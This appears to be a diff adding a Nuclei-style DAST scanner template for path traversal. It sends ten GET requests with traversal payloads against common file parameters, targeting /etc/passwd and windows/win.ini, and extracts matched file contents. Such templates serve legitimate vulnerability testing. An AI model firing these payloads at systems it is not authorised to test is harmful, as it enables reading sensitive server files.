@@ -1,0 +1,55 @@
+id: cosckoya-dast-path-traversal-fuzz
+
+info:
+  name: DAST Path Traversal Fuzzing
+  author: cosckoya
+  severity: high
+  description: |
+    DAST fuzzing template for path traversal detection. Tests multiple
+    traversal payloads against file parameters to detect LFI/RFI
+    vulnerabilities.
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+    - https://cwe.mitre.org/data/definitions/22.html
+  tags: dast,fuzz,path-traversal,lfi,rfi,dynamic
+  metadata:
+    max-request: 10
+    verified: true
+    fuzz-type: parameter
+    fuzz-aggression: medium
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=../../../etc/passwd"
+      - "{{BaseURL}}/?file=..%2f..%2f..%2fetc/passwd"
+      - "{{BaseURL}}/?file=..%5c..%5c..%5cwindows/win.ini"
+      - "{{BaseURL}}/?page=../../../etc/passwd"
+      - "{{BaseURL}}/?doc=../../../etc/passwd"
+      - "{{BaseURL}}/?view=../../../etc/passwd"
+      - "{{BaseURL}}/?include=../../../etc/passwd"
+      - "{{BaseURL}}/?template=../../../etc/passwd"
+      - "{{BaseURL}}/?load=../../../etc/passwd"
+      - "{{BaseURL}}/?display=../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:x:"
+          - "[fonts]"
+          - "[extensions]"
+          - "localhost"
+        part: body
+        condition: or
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        part: body
+        name: traversal-content
+        regex:
+          - "(root:x:|\[fonts\]|\[extensions\])"
+        group: 0
